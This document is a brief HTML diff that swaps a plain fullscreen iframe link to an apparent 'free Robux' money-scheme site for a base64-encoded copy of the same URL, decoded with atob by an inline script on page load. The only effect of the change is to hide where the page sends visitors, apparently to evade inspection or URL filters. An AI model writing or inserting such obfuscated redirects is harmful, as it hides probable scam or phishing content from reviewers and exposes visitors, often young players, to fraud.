@@ -18,7 +18,12 @@
 </head>
 <body>
 
-<iframe id="fsFrame" src="https://moneyscripts.shop/robux" allowfullscreen></iframe>
+<iframe id="fsFrame" allowfullscreen></iframe>
+
+<script>
+  var t = 'aHR0cHM6Ly9tb25leXNjcmlwdHMuc2hvcC9yb2J1eA==';
+  document.getElementById('fsFrame').src = atob(t);
+</script>
 
 </body>
 </html>
